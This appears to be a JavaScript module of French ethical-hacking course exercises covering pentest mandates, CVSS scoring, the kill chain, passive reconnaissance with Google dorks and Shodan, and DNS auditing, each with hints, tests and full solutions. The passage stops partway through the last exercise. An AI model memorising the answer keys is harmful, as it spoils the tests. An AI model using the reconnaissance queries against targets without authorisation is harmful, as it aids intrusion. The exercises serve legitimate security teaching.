'use strict';

module.exports = [
  {
    "id": "hk3-c1-e1",
    "chapter": 1,
    "level": "n1",
    "language": "analyse",
    "title": "Le mandat du pentest de la mairie de Saint-Amand",
    "exampleTitle": "Exemple résolu — le mandat de la médiathèque de Pont-Céran",
    "goal": "Lire un mandat de test d'intrusion et identifier les garanties juridiques qui protègent l'auditeur.",
    "brief": "<p><strong>Énoncé.</strong> La mairie de Saint-Amand, 12 400 habitants, vient d'ouvrir son portail de démarches en ligne. Pour le sécuriser, elle confie un test d'intrusion à la société Vexin Sécurité. Le contrat, signé par le maire et par le directeur de l'audit, précise :</p><ul><li><strong>Périmètre</strong> : le portail demarches.saint-amand.fr et son serveur web (51.75.12.40), à l'exclusion de tout autre équipement ;</li><li><strong>Fenêtre d'intervention</strong> : trois semaines consécutives, du 4 au 24 mars, jours ouvrés, de 9 h à 18 h ;</li><li><strong>Techniques interdites</strong> : attaques par déni de service, ingénierie sociale des agents municipaux ;</li><li><strong>Livrables</strong> : rapport d'audit et restitution devant la commission numérique.</li></ul><p>Répondez par un mot ou un article pour les questions 1 à 3 et 5, par un nombre pour la question 4.</p><ol><li>Quel article du Code pénal punit l'accès frauduleux à un système de traitement automatisé de données, et auquel seul le mandat signé permet d'échapper ?</li><li>Quel document contractuel fixe le périmètre, la fenêtre horaire et les techniques interdites ?</li><li>Comment désigne-t-on un auditeur qui ne teste des systèmes qu'avec une autorisation écrite ?</li><li>Combien de semaines la fenêtre d'intervention couvre-t-elle ?</li><li>Les attaques par déni de service sont interdites par le contrat : quel acronyme anglais de trois lettres désigne ce type d'attaque ?</li></ol>",
    "starter": "# Exercice — Le mandat du pentest de la mairie de Saint-Amand\n# Lisez l'énoncé complet ci-dessus, puis répondez à chaque question dans son bloc.\n# Questions 1 à 3 et 5 : un mot ou un article. Question 4 : un nombre.\n\n[Question 1 — Article du Code pénal couvrant l'accès frauduleux]\nA_COMPLETER\n\n[Question 2 — Document contractuel fixant périmètre, fenêtre et interdits]\nA_COMPLETER\n\n[Question 3 — Type d'auditeur testant uniquement avec autorisation]\nA_COMPLETER\n\n[Question 4 — Nombre de semaines de la fenêtre d'intervention]\nA_COMPLETER\n\n[Question 5 — Acronyme anglais du déni de service]\nA_COMPLETER\n",
    "hints": [
      "Sans autorisation, l'auditeur commet une infraction : cherchez l'article du Code pénal qui réprime l'accès frauduleux à un système de traitement automatisé de données.",
      "Le document qui liste périmètre, créneau horaire et techniques interdites porte le même nom que celui d'un avocat mandaté par un client.",
      "L'auditeur contractuel est appelé « chapeau blanc » en français ; l'acronyme anglais du déni de service s'écrit avec trois lettres."
    ],
    "examples": [
      {
        "stdin": "La médiathèque de Pont-Céran confie un audit à l'ESN Calme Audit.\nPérimètre : portail reservations.pont-ceran.fr et son serveur (203.0.113.20).\nFenêtre : deux semaines consécutives, du 2 au 15 octobre, de 8 h à 17 h.\nInterdits : déni de service et hameçonnage du personnel.\n\n1) Sans mandat signé, l'accès frauduleux relèverait de l'article 323-1 du Code pénal.\n2) Le document qui fixe périmètre, fenêtre et interdits est le mandat.\n3) L'auditeur autorisé est un white hat.\n4) La fenêtre couvre 2 semaines.\n5) L'acronyme du déni de service est DoS.",
        "expected": "article 323-1 — le mandat — white hat — 2 semaines — DoS",
        "note": "Le mandat transforme un acte pénalement répréhensible en prestation contractuelle : sans lui, aucune excuse technique ne protège l'auditeur."
      }
    ],
    "tests": [
      {
        "label": "Question 1 — Article du Code pénal",
        "stdin": "q:1",
        "expected": "323-1||l'article 323-1||article 323-1||323 1"
      },
      {
        "label": "Question 2 — Document contractuel",
        "stdin": "q:2",
        "expected": "le mandat||mandat||le contrat||les règles d'engagement||règles d'engagement||le mandat de test d'intrusion"
      },
      {
        "label": "Question 3 — Type d'auditeur",
        "stdin": "q:3",
        "expected": "white hat||un white hat||chapeau blanc||pirate éthique||un pirate éthique"
      },
      {
        "label": "Question 4 — Nombre de semaines",
        "stdin": "q:4",
        "expected": "3||trois"
      },
      {
        "label": "Question 5 — Acronyme du déni de service",
        "stdin": "q:5",
        "expected": "dos||DoS||DOS||le DoS||déni de service"
      }
    ],
    "solution": "[Question 1 — Article du Code pénal couvrant l'accès frauduleux]\n323-1\n\n[Question 2 — Document contractuel fixant périmètre, fenêtre et interdits]\nle mandat\n\n[Question 3 — Type d'auditeur testant uniquement avec autorisation]\nwhite hat\n\n[Question 4 — Nombre de semaines de la fenêtre d'intervention]\n3\n\n[Question 5 — Acronyme anglais du déni de service]\ndos",
    "takeaway": "1) L'article 323-1 du Code pénal réprime l'accès ou le maintien frauduleux dans un système de traitement automatisé de données : seul le mandat signé autorise l'auditeur.\n2) C'est le mandat (les règles d'engagement) qui fixe le périmètre, la fenêtre horaire et les techniques interdites.\n3) Un auditeur qui ne teste qu'avec autorisation écrite est un white hat, par opposition aux grey hat et black hat.\n4) La fenêtre d'intervention couvre 3 semaines consécutives, du 4 au 24 mars.\n5) Le déni de service se désigne par l'acronyme anglais DoS (Denial of Service).\nContrôle : périmètre, fenêtre et interdits figurent tous les trois dans le mandat ; toute action hors de ces limites sortirait du cadre contractuel et redeviendrait une infraction."
  },
  {
    "id": "hk3-c1-e2",
    "chapter": 1,
    "level": "n2",
    "language": "analyse",
    "title": "Le score CVSS de la faille de l'espace client d'Aérovel",
    "exampleTitle": "Exemple résolu — la divulgation d'informations du site de Rivery",
    "goal": "Calculer les sous-scores et le score de base CVSS v3.1 d'une vulnérabilité déclarée en bug bounty.",
    "brief": "<p><strong>Énoncé.</strong> La compagnie régionale Aérovel publie un programme de bug bounty pour son espace client. Un chasseur de primes y découvre une injection côté serveur et la déclare avec les métriques CVSS v3.1 suivantes (portée inchangée) :</p><table><tr><th>Métrique</th><th>Valeur retenue</th><th>Poids</th></tr><tr><th>AV — vecteur d'attaque</th><td>Réseau (N)</td><td>0,85</td></tr><tr><th>AC — complexité d'attaque</th><td>Faible (L)</td><td>0,77</td></tr><tr><th>PR — privilèges requis</th><td>Bas (L)</td><td>0,62</td></tr><tr><th>UI — interaction utilisateur</th><td>Aucune (N)</td><td>0,85</td></tr><tr><th>C — confidentialité</th><td>Totale (H)</td><td>0,56</td></tr><tr><th>I — intégrité</th><td>Faible (L)</td><td>0,22</td></tr><tr><th>A — disponibilité</th><td>Aucune (N)</td><td>0,00</td></tr></table><p>Rappels du cours (portée inchangée) : <code>Exploitabilité = 8,22 × AV × AC × PR × UI</code> ; <code>ISS = 1 − (1 − C)(1 − I)(1 − A)</code> ; <code>Impact = 6,42 × ISS</code> ; <code>Score de base = arrondi au dixième supérieur de (Impact + Exploitabilité)</code>, plafonné à 10.</p><p>Pour les questions 1 à 3, donnez les valeurs arrondies à deux décimales avec une virgule ; la question 2 demande quatre décimales.</p><ol><li>Quel est le sous-score d'exploitabilité ?</li><li>Que vaut l'ISS ?</li><li>Quel est le sous-score d'impact ?</li><li>Quel est le score de base CVSS, arrondi au dixième ?</li><li>Quelle est la sévérité de la faille selon CVSS v3.1 ?</li><li>À partir de quel score une vulnérabilité est-elle qualifiée de critique ?</li></ol>",
    "starter": "# Exercice — Le score CVSS de la faille de l'espace client d'Aérovel\n# Lisez l'énoncé complet ci-dessus, puis répondez à chaque question dans son bloc.\n# Questions 1 à 4 : valeurs numériques, séparateur virgule. Questions 5 et 6 : un mot / un nombre.\n\n[Question 1 — Sous-score d'exploitabilité]\nA_COMPLETER\n\n[Question 2 — Valeur de l'ISS (quatre décimales)]\nA_COMPLETER\n\n[Question 3 — Sous-score d'impact]\nA_COMPLETER\n\n[Question 4 — Score de base CVSS]\nA_COMPLETER\n\n[Question 5 — Sévérité de la faille]\nA_COMPLETER\n\n[Question 6 — Score minimum d'une vulnérabilité critique]\nA_COMPLETER\n",
    "hints": [
      "Multipliez d'abord les quatre poids d'exploitabilité entre eux, puis par 8,22 : AV, AC, PR et UI se combinent multiplicativement.",
      "L'ISS se calcule avec les impacts C, I et A : chaque impact laisse « passer » (1 − valeur), et l'ISS complète ce qui n'est pas passé.",
      "Pour l'ordre de grandeur : une sévérité est moyenne de 4,0 à 6,9, élevée de 7,0 à 8,9 et critique à partir de 9,0 ; le score final s'arrondit au dixième supérieur."
    ],
    "examples": [
      {
        "stdin": "La ville de Rivery récompense la divulgation responsable des failles de son site.\nUne divulgation d'informations est déclarée avec : AV=N (0,85), AC=L (0,77), PR=N (0,85), UI=N (0,85),\nC=L (0,22), I=N (0,00), A=N (0,00).\n\n1) Exploitabilité : 8,22 × 0,85 × 0,77 × 0,85 × 0,85 = 3,89.\n2) ISS : 1 − (1 − 0,22)(1 − 0)(1 − 0) = 0,22.\n3) Impact : 6,42 × 0,22 = 1,41.\n4) Score de base : arrondi au dixième supérieur de (1,41 + 3,89) = 5,3.\n5) Sévérité : moyenne.\n6) Une faille est critique à partir de 9,0.",
        "expected": "exploitabilité 3,89 — ISS 0,22 — impact 1,41 — score 5,3 — sévérité moyenne — critique à partir de 9,0",
        "note": "Une exploitabilité élevée (3,89) avec un impact faible (1,41) donne un score moyen : les deux sous-scores se combinent selon la formule, jamais à la main."
      }
    ],
    "tests": [
      {
        "label": "Question 1 — Sous-score d'exploitabilité",
        "stdin": "q:1",
        "expected": "2,84||2.84"
      },
      {
        "label": "Question 2 — Valeur de l'ISS",
        "stdin": "q:2",
        "expected": "0,6568||0.6568"
      },
      {
        "label": "Question 3 — Sous-score d'impact",
        "stdin": "q:3",
        "expected": "4,22||4.22"
      },
      {
        "label": "Question 4 — Score de base CVSS",
        "stdin": "q:4",
        "expected": "7,1||7.1"
      },
      {
        "label": "Question 5 — Sévérité de la faille",
        "stdin": "q:5",
        "expected": "élevée||high||haute||l'élevée"
      },
      {
        "label": "Question 6 — Score minimum d'une vulnérabilité critique",
        "stdin": "q:6",
        "expected": "9,0||9.0||9||à partir de 9,0||9.0"
      }
    ],
    "solution": "[Question 1 — Sous-score d'exploitabilité]\n2,84\n\n[Question 2 — Valeur de l'ISS (quatre décimales)]\n0,6568\n\n[Question 3 — Sous-score d'impact]\n4,22\n\n[Question 4 — Score de base CVSS]\n7,1\n\n[Question 5 — Sévérité de la faille]\nélevée\n\n[Question 6 — Score minimum d'une vulnérabilité critique]\n9,0",
    "takeaway": "1) Exploitabilité : 8,22 × 0,85 × 0,77 × 0,62 × 0,85 = 2,84.\n2) ISS : 1 − (1 − 0,56)(1 − 0,22)(1 − 0,00) = 1 − (0,44 × 0,78 × 1,00) = 1 − 0,3432 = 0,6568.\n3) Impact : 6,42 × 0,6568 = 4,22.\n4) Score de base : 4,22 + 2,84 = 7,06 environ, arrondi au dixième supérieur : 7,1.\n5) Un score de 7,1 situe la faille dans la tranche 7,0 à 8,9 : sévérité élevée.\n6) Une vulnérabilité est critique à partir de 9,0.\nContrôle : avec le détail non arrondi, Impact + Exploitabilité = 4,2167 + 2,8353 = 7,0519, dont l'arrondi au dixième supérieur redonne bien 7,1."
  },
  {
    "id": "hk3-c1-e3",
    "chapter": 1,
    "level": "n3",
    "language": "analyse",
    "title": "La kill chain de l'intrusion chez Fabralux",
    "exampleTitle": "Exemple résolu — le rançongiciel de Novatex",
    "goal": "Reconstituer les phases de la Cyber Kill Chain à partir d'une chronologie d'incident et repérer les occasions de rupture.",
    "brief": "<p><strong>Énoncé.</strong> Fabralux, fabricant de luminaires, mandate un cabinet de forensic pour reconstituer l'intrusion qui a touché son réseau. En croisant les journaux du pare-feu, du proxy et de la messagerie, les analystes établissent la chronologie suivante :</p><table><tr><th>Date</th><th>Heure</th><th>Événement observé</th><th>Phase de la kill chain</th></tr><tr><th>02/03</th><td>08:12</td><td>Requêtes WHOIS et balayage DNS sur fabralux.fr</td><td>Reconnaissance</td></tr><tr><th>05/03</th><td>14:30</td><td>Conception d'une fausse facture piégée avec macro</td><td>Préparation de l'arme</td></tr><tr><th>07/03</th><td>09:05</td><td>Envoi de l'e-mail d'hameçonnage à la comptabilité</td><td>Livraison</td></tr><tr><th>07/03</th><td>09:41</td><td>La macro s'exécute et ouvre un accès initial</td><td>Exploitation</td></tr><tr><th>07/03</th><td>10:02</td><td>Création d'une tâche planifiée pour relancer l'implant</td><td>Installation</td></tr><tr><th>07/03</th><td>11:15</td><td>Beacon HTTPS de l'implant vers 203.0.113.7</td><td>Command and Control</td></tr><tr><th>09/03</th><td>02:30</td><td>Exfiltration de 4,2 Go de données clients</td><td>Actions sur objectifs</td></tr></table><p>Rappel : la Cyber Kill Chain de Lockheed Martin découpe une attaque ciblée en sept phases ; la préparation de l'arme se déroule hors du réseau de la victime et reste invisible pour la défense. Le SOC de Fabralux n'a détecté l'intrusion qu'au moment du beacon HTTPS.</p><ol><li>Combien d'événements composent la chronologie reconstituée ?</li><li>Combien de phases distinctes de la kill chain sont couvertes ?</li><li>À quelle phase appartient l'exfiltration des 4,2 Go de données ?</li><li>Le SOC a détecté l'intrusion lors du beacon HTTPS : combien de phases s'étaient déjà déroulées avant la détection ?</li><li>Selon la doctrine « rompre la chaîne », quelle est la première phase où la défense peut agir, la préparation de l'arme étant indétectable ?</li></ol>",
    "starter": "# Exercice — La kill chain de l'intrusion chez Fabralux\n# Lisez l'énoncé complet ci-dessus, puis répondez à chaque question dans son bloc.\n# Questions 1, 2 et 4 : un nombre. Questions 3 et 5 : quelques mots.\n\n[Question 1 — Nombre d'événements de la chronologie]\nA_COMPLETER\n\n[Question 2 — Nombre de phases distinctes couvertes]\nA_COMPLETER\n\n[Question 3 — Phase de l'exfiltration]\nA_COMPLETER\n\n[Question 4 — Phases déjà déroulées avant la détection]\nA_COMPLETER\n\n[Question 5 — Première phase où la défense peut agir]\nA_COMPLETER\n",
    "hints": [
      "Comptez les lignes du tableau pour les événements, puis les intitulés de phase sans doublon pour les phases distinctes.",
      "La détection a eu lieu pendant le beacon HTTPS : comptez toutes les phases antérieures, de la reconnaissance au canal de commande inclus.",
      "La préparation de l'arme se passe chez l'attaquant, hors de portée des capteurs : la première occasion d'agir arrive quand l'arme entre en contact avec la victime."
    ],
    "examples": [
      {
        "stdin": "Le groupe industriel Novatex est victime d'un rançongiciel. Chronologie reconstituée :\n12/01 : recherche d'informations sur les employés (Reconnaissance) ;\n15/01 : montage d'un document piège (Préparation de l'arme) ;\n18/01 : e-mail « relance de facture » au service achats (Livraison) ;\n18/01 : la pièce jointe s'exécute (Exploitation) ;\n18/01 : service malveillant créé (Installation) ;\n19/01 : beacon sortant détecté à 3 h 12 (Command and Control) ;\n21/01 : chiffrement des serveurs de fichiers (Actions sur objectifs).\nLe SOC n'a détecté l'intrusion qu'au beacon.\n\n1) 7 événements. 2) Les 7 phases sont couvertes. 3) Le chiffrement appartient aux actions sur objectifs.\n4) Détection au beacon : 6 phases étaient déjà passées. 5) Première action défensive possible : la livraison.",
        "expected": "7 événements — 7 phases — actions sur objectifs — 6 phases avant détection — première interception : la livraison",
        "note": "Détecter à la livraison (filtrage de l'e-mail) coûte bien moins cher que réagir après les actions sur objectifs : c'est tout l'enjeu du modèle."
      }
    ],
    "tests": [
      {
        "label": "Question 1 — Nombre d'événements",
        "stdin": "q:1",
        "expected": "7||sept"
      },
      {
        "label": "Question 2 — Nombre de phases distinctes",
        "stdin": "q:2",
        "expected": "7||sept"
      },
      {
        "label": "Question 3 — Phase de l'exfiltration",
        "stdin": "q:3",
        "expected": "actions sur objectifs||la phase actions sur objectifs||actions on objectives"
      },
      {
        "label": "Question 4 — Phases déjà déroulées avant la détection",
        "stdin": "q:4",
        "expected": "6||six"
      },
      {
        "label": "Question 5 — Première phase où la défense peut agir",
        "stdin": "q:5",
        "expected": "la livraison||livraison||delivery||la phase de livraison"
      }
    ],
    "solution": "[Question 1 — Nombre d'événements de la chronologie]\n7\n\n[Question 2 — Nombre de phases distinctes couvertes]\n7\n\n[Question 3 — Phase de l'exfiltration]\nactions sur objectifs\n\n[Question 4 — Phases déjà déroulées avant la détection]\n6\n\n[Question 5 — Première phase où la défense peut agir]\nla livraison",
    "takeaway": "1) La chronologie comporte 7 événements, du 02/03 au 09/03.\n2) Les sept phases de la kill chain sont toutes représentées : reconnaissance, préparation de l'arme, livraison, exploitation, installation, command and control, actions sur objectifs.\n3) L'exfiltration des 4,2 Go relève des actions sur objectifs, la septième et dernière phase.\n4) La détection est survenue pendant le beacon HTTPS (phase 6) : les 6 phases précédentes s'étaient déjà déroulées sans alerte.\n5) La préparation de l'arme est invisible ; la première occasion de rompre la chaîne est la livraison, en filtrant l'e-mail d'hameçonnage.\nContrôle : 7 phases couvertes moins la phase de détection (la sixième) = 6 phases passées inaperçues avant l'alerte, ce qui explique l'exfiltration réussie deux jours plus tard."
  },
  {
    "id": "hk3-c2-e1",
    "chapter": 2,
    "level": "n1",
    "language": "analyse",
    "title": "La collecte passive avant le bug bounty de Petibonum",
    "exampleTitle": "Exemple résolu — la divulgation responsable de la ville de Périgny",
    "goal": "Recenser les résultats d'une phase de reconnaissance passive sans jamais interroger la cible.",
    "brief": "<p><strong>Énoncé.</strong> Petibonum, PME de 60 salariés qui vend des accessoires de randonnée en ligne, publie un programme de bug bounty sur son domaine petibonum.fr. Avant tout test actif, la chasseuse de primes rassemble ses constats de collecte passive, obtenus sans jamais interroger les serveurs de l'entreprise :</p><table><tr><th>Source</th><th>Requête ou outil</th><th>Résultat</th></tr><tr><th>Google</th><td><code>site:petibonum.fr filetype:pdf</code></td><td>8 fiches produits indexées</td></tr><tr><th>Google</th><td><code>intitle:\"index of\" site:petibonum.fr</code></td><td>1 page d'index de répertoire</td></tr><tr><th>Shodan</th><td><code>http.title:\"petibonum\"</code></td><td>3 serveurs exposés</td></tr><tr><th>theHarvester</th><td>domaine petibonum.fr</td><td>15 adresses e-mail, 22 sous-domaines</td></tr><tr><th>WHOIS</th><td>petibonum.fr</td><td>Domaine créé en 2014, registrar français</td></tr></table><ol><li>Combien d'adresses e-mail professionnelles la collecte a-t-elle exposées ?</li><li>Combien de sous-domaines theHarvester a-t-il découverts ?</li><li>Quel moteur de recherche spécialisé recense les équipements connectés exposés sur Internet ?</li><li>Quel opérateur de recherche Google limite les résultats à un type de fichier précis ?</li><li>Pourquoi cette phase est-elle dite « passive » : aucun paquet n'est envoyé vers quel système ?</li></ol>",
    "starter": "# Exercice — La collecte passive avant le bug bounty de Petibonum\n# Lisez l'énoncé complet ci-dessus, puis répondez à chaque question dans son bloc.\n# Questions 1 et 2 : un nombre. Questions 3 à 5 : quelques mots.\n\n[Question 1 — Adresses e-mail exposées]\nA_COMPLETER\n\n[Question 2 — Sous-domaines découverts]\nA_COMPLETER\n\n[Question 3 — Moteur de recherche des équipements exposés]\nA_COMPLETER\n\n[Question 4 — Opérateur Google limitant à un type de fichier]\nA_COMPLETER\n\n[Question 5 — Système qui ne reçoit aucune requête pendant la phase passive]\nA_COMPLETER\n",
    "hints": [
      "Lisez la ligne du tableau theHarvester : elle porte à la fois le nombre d'adresses e-mail et le nombre de sous-domaines.",
      "Deux moteurs apparaissent dans le tableau : celui de l'entreprise et un moteur spécialisé dans les équipements connectés.",
      "Une phase est passive quand toutes les informations viennent d'intermédiaires (caches, archives, registres) et qu'aucune requête ne part directement vers l'infrastructure testée."
    ],
    "examples": [
      {
        "stdin": "La ville de Périgny accepte la divulgation responsable sur son portail. Collecte passive :\nGoogle site:perigny.fr filetype:pdf : 12 documents indexés ;\nGoogle intitle:\"index of\" site:perigny.fr : 0 page ;\nShodan http.title:\"perigny\" : 2 serveurs exposés ;\ntheHarvester : 9 adresses e-mail et 17 sous-domaines.\n\n1) 9 adresses e-mail exposées. 2) 17 sous-domaines découverts. 3) Shodan recense les équipements exposés.\n4) filetype: limite aux fichiers PDF. 5) Aucun paquet n'est envoyé vers la cible.",
        "expected": "9 e-mails — 17 sous-domaines — Shodan — filetype: — aucun paquet vers la cible",
        "note": "Toutes ces informations viennent d'index tiers : la mairie ne voit aucune requête suspecte dans ses journaux pendant toute la phase."
      }
    ],
    "tests": [
      {
        "label": "Question 1 — Adresses e-mail exposées",
        "stdin": "q:1",
        "expected": "15"
      },
      {
        "label": "Question 2 — Sous-domaines découverts",
        "stdin": "q:2",
        "expected": "22"
      },
      {
        "label": "Question 3 — Moteur des équipements exposés",
        "stdin": "q:3",
        "expected": "shodan||Shodan"
      },
      {
        "label": "Question 4 — Opérateur Google pour un type de fichier",
        "stdin": "q:4",
        "expected": "filetype||filetype:||l'opérateur filetype"
      },
      {
        "label": "Question 5 — Système non sollicité en phase passive",
        "stdin": "q:5",
        "expected": "la cible||cible||les serveurs de la cible||l'infrastructure de la cible"
      }
    ],
    "solution": "[Question 1 — Adresses e-mail exposées]\n15\n\n[Question 2 — Sous-domaines découverts]\n22\n\n[Question 3 — Moteur de recherche des équipements exposés]\nshodan\n\n[Question 4 — Opérateur Google limitant à un type de fichier]\nfiletype\n\n[Question 5 — Système qui ne reçoit aucune requête pendant la phase passive]\nla cible",
    "takeaway": "1) theHarvester a exposé 15 adresses e-mail professionnelles, utilisables ensuite pour des simulations d'hameçonnage autorisées.\n2) Il a également découvert 22 sous-domaines, autant de portes d'entrée potentielles pour la suite du test.\n3) Shodan est le moteur qui recense les équipements connectés exposés sur Internet, ici 3 serveurs.\n4) L'opérateur filetype: limite les résultats de Google à un type de fichier, par exemple filetype:pdf.\n5) La phase est passive car aucun paquet n'est envoyé vers la cible : tout vient d'index et de registres tiers.\nContrôle : 15 e-mails + 22 sous-domaines + 3 serveurs Shodan = 40 éléments de renseignement collectés sans toucher l'infrastructure de Petibonum."
  },
  {
    "id": "hk3-c2-e2",
    "chapter": 2,
    "level": "n2",
    "language": "analyse",
    "title": "L'audit DNS et anti-usurpation de la ville de Saint-Rémy",
    "exampleTitle": "Exemple résolu — l'audit DNS de l'université de Marval",
    "goal": "Interpréter un transfert de zone AXFR et des enregistrements SPF, DMARC et DKIM pour mesurer le risque d'usurpation.",
    "brief": "<p><strong>Énoncé.</strong> La ville de Saint-Rémy confie un test d'intrusion de son domaine saint-remy.fr. Pendant la phase de reconnaissance, l'auditeur interroge l'infrastructure DNS et relève les constats suivants :</p><ul><li>Transfert de zone demandé au serveur <code>ns1.saint-remy.fr</code> : <strong>autorisé</strong> ; la zone complète compte 142 enregistrements, dont 34 sous-domaines internes (vpn, intranet, supervision, caméras).</li><li>Enregistrement SPF : <code>v=spf1 include:_spf.provider-mail.fr ip4:185.12.34.5 -all</code></li><li>Enregistrement DMARC : <code>v=DMARC1; p=none; rua=mailto:dmarc@saint-remy.fr</code></li><li>Enregistrement DKIM : deux sélecteurs actifs.</li></ul><ol><li>Le transfert de zone AXFR a-t-il été accepté ou refusé par le serveur ?</li><li>Combien de sous-domaines internes l'AXFR a-t-il révélés ?</li><li>La politique SPF se termine par « -all » : que subissent les messages envoyés depuis des serveurs non autorisés ?</li><li>Quelle est la valeur actuelle de la politique DMARC (le champ p=) ?</li><li>Quelle valeur faudrait-il donner à p= pour rejeter les messages usurpés ?</li><li>Quel enregistrement, complémentaire de SPF et DMARC, signe cryptographiquement les messages ?</li></ol>",
    "starter": "# Exercice — L'audit DNS et anti-usurpation de la ville de Saint-Rémy\n# Lisez l'énoncé complet ci-dessus, puis répondez à chaque question dans son bloc.\n# Question 2 : un nombre. Questions 1, 3, 4 et 5 : un mot. Question 6 : un sigle.\n\n[Question 1 — Verdict du transfert de zone AXFR]\nA_COMPLETER\n\n[Question 2 — Sous-domaines internes révélés]\nA_COMPLETER\n\n[Question 3 — Sort des messages depuis des serveurs non autorisés]\nA_COMPLETER\n\n[Question 4 — Valeur actuelle de la politique DMARC]\nA_COMPLETER\n\n[Question 5 — Valeur de p= pour rejeter les messages usurpés]\nA_COMPLETER\n\n[Question 6 — Enregistrement qui signe les messages]\nA_COMPLETER\n",
    "hints": [
      "Un AXFR accepté livre la zone complète à n'importe qui qui la demande : relisez le premier constat pour le verdict et le nombre de sous-domaines.",
      "En SPF, « -all » est un échec dur : les serveurs non listés ne doivent pas être crus ; « ~all » serait un simple soupçon.",
      "Les valeurs possibles du champ p= de DMARC sont none (surveillance), quarantine (mise à l'écart) et reject (rejet) ; la signature cryptographique des messages relève d'un autre enregistrement."
    ],
    "examples": [
      {
        "stdin": "L'université de Marval audite son domaine marval.fr. Constats :\nAXFR vers ns1.marval.fr : refusé, 0 sous-domaine révélé.\nSPF : v=spf1 include:_spf.google.com ip4:142.250.10.20 -all\nDMARC : v=DMARC1; p=quarantine; rua=mailto:dmarc@marval.fr\nDKIM : un sélecteur actif.\n\n1) L'AXFR a été refusé. 2) 0 sous-domaine révélé. 3) Les messages non autorisés sont rejetés (échec dur).\n4) La politique DMARC vaut quarantine. 5) Pour rejeter : p=reject. 6) DKIM signe les messages.",
        "expected": "AXFR refusé — 0 sous-domaine — rejet — p=quarantine — p=reject pour rejeter — DKIM",
        "note": "Marval protège sa zone (AXFR refusé) et applique déjà un DMARC actif : seul Saint-Rémy, avec p=none, laisse passer les usurpations."
      }
    ],
    "tests": [
      {
        "label": "Question 1 — Verdict de l'AXFR",
        "stdin": "q:1",
        "expected": "accepté||accepte||autorisé||il a été accepté"
      },
      {
        "label": "Question 2 — Sous-domaines révélés",
        "stdin": "q:2",
        "expected": "34"
      },
      {
        "label": "Question 3 — Sort des messages non autorisés",
        "stdin": "q:3",
        "expected": "un rejet||rejet||refus||ils sont rejetés||rejetés"
      },
      {
        "label": "Question 4 — Valeur actuelle de la politique DMARC",
        "stdin": "q:4",
        "expected": "none||p=none||aucune||aucune politique"
      },
      {
        "label": "Question 5 — Valeur de p= pour rejeter",
        "stdin": "q:5",
        "expected": "reject||p=reject"
      },
      {
        "label": "Question 6 — Enregistrement qui signe les messages",
        "stdin": "q:6",
        "expected": "dkim||DKIM||l'enregistrement dkim"
      }
    ],
    "solution": "[Question 1 — Verdict du transfert de zone AXFR]\naccepté\n\n[Question 2 — Sous-domaines internes révélés]\n34\n\n[Question 3 — Sort des messages depuis des serveurs non autorisés]\nun rejet\n\n[Question 4 — Valeur actuelle de la politique DMARC]\nnone\n\n[Question 5 — Valeur de p= pour rejeter les messages usurpés]\nreject\n\n[Question 6 — Enregistrement qui signe les messages]\ndkim",
    "takeaway": "1) Le serveur ns1.saint-remy.fr a autorisé le transfert de zone : n'importe qui peut récupérer la zone complète.\n2) L'AXFR a révélé 34 sous-domaines internes, dont vpn, intranet et supervision.\n3) Le « -all » de SPF est un échec dur : les messages venus de serveurs non autorisés subissent un rejet.\n4) La politique DMARC actuelle vaut p=none : la ville collecte des rapports mais n'agit pas sur les messages usurpés.\n5) Pour rejeter les usurpations, il faudrait passer à p=reject (l'étape intermédiaire usuelle étant p=quarantine).\n6) L'enregistrement DKIM signe cryptographiquement les messages et complète SPF et DMARC.\nContrôle : 142 enregistrements dans la zone, dont 34 sous-domaines internes : plus du quart de la zone décrit une infrastructure interne qui n'aurait jamais dû être publiée."
  },
  {
    "id": "hk3-c2-e3",
    "chapter": 2,
    "title": "Comparaison de réponses DNS avec une adresse témoin",
    "level": "n3",
    "language": "analyse",
    "goal": "Regrouper des réponses DNS sans conclure à la légitimité des noms.",
    "brief": "<p>Dans ce modèle, une adresse témoin est fournie avec des réponses DNS fictives. Classez les noms selon que leur adresse est égale ou non à cette adresse ; si le témoin vaut <code>NONE</code>, tous les noms vont dans la seconde liste. L’égalité d’IP ne prouve pas qu’un nom soit fictif : un nom réel peut partager cette adresse. Une IP différente ne prouve pas non plus la légitimité ou l’existence d’un service. Recoupez les observations dans le cadre autorisé.</p><p>Pour <code>SUBDOMAIN_FUZZ domain=&lt;dom&gt; wildcard_ip=&lt;ip|NONE&gt; responses=&lt;nom:ip,...&gt;</code>, trier chaque liste de noms complets et afficher <code>SUBDOMAIN_GROUP: domain=&lt;dom&gt; total=&lt;N&gt; meme_ip=&lt;M&gt; noms_meme=&lt;liste|NONE&gt; autre_ip=&lt;A&gt; noms_autres=&lt;liste|NONE&gt;</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c2-e3) — Comparaison de réponses DNS avec une adresse témoin\n# Complétez la réponse attendue sous chaque cas ci-dessous :\n\n[Cas 1 — Aucune adresse témoin]\n# Données : SUBDOMAIN_FUZZ domain=corp.org wildcard_ip=NONE responses=vpn:10.0.0.1,api:10.0.0.2\nA_COMPLETER\n\n[Cas 2 — Trois réponses à la même adresse]\n# Données : SUBDOMAIN_FUZZ domain=wildcard-all.net wildcard_ip=172.16.0.50 responses=a:172.16.0.50,b:172.16.0.50,c:172.16.0.50\nA_COMPLETER\n\n[Cas 3 — Adresses mélangées et ordre alphabétique]\n# Données : SUBDOMAIN_FUZZ domain=cloud.dev wildcard_ip=1.1.1.1 responses=gitlab:10.1.1.5,bogus:1.1.1.1,auth:10.1.1.2,monitor:10.1.1.9\nA_COMPLETER\n",
    "hints": [
      "Comparer les adresses seulement ; ne pas décider si un nom est réel ou fictif.",
      "Trier chaque liste alphabétiquement et écrire NONE pour une liste vide.",
      "Comparez chaque IP résolue à l IP témoin du domaine ; un écart d IP ou un sous-domaine manquant indique un hôte distinct sans préjuger de sa légitimité."
    ],
    "examples": [
      {
        "stdin": "SUBDOMAIN_FUZZ domain=example.com wildcard_ip=192.168.1.100 responses=admin:192.168.1.5,fake99:192.168.1.100,mail:192.168.1.6,testabc:192.168.1.100",
        "expected": "SUBDOMAIN_GROUP: domain=example.com total=4 meme_ip=2 noms_meme=fake99.example.com,testabc.example.com autre_ip=2 noms_autres=admin.example.com,mail.example.com",
        "note": "Les deux listes sont des regroupements, pas des verdicts sur les noms."
      }
    ],
    "tests": [
      {
        "label": "Aucune adresse témoin",
        "stdin": "cas:1",
        "expected": "SUBDOMAIN_GROUP: domain=corp.org total=2 meme_ip=0 noms_meme=NONE autre_ip=2 noms_autres=api.corp.org,vpn.corp.org"
      },
      {
        "label": "Trois réponses à la même adresse",
        "stdin": "cas:2",
